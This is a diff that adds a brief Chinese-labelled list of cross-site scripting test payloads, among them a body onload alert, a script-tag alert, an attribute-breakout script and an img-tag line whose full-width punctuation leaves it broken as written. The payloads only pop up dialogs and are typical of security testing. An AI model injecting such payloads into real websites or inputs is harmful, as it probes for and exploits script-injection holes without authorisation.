@@ -1,0 +1,6 @@
+1.加载完毕自动触发事件
+<body onload="alert('xss')"></body>
+2，弹窗
+<script>alert('XSS')</script>
+<img src = 1 confirm（“这是弹窗显示的文字！”）; prompt（“这是用来触发的文字”）;>
+"/><script>alert(/a/)</script>
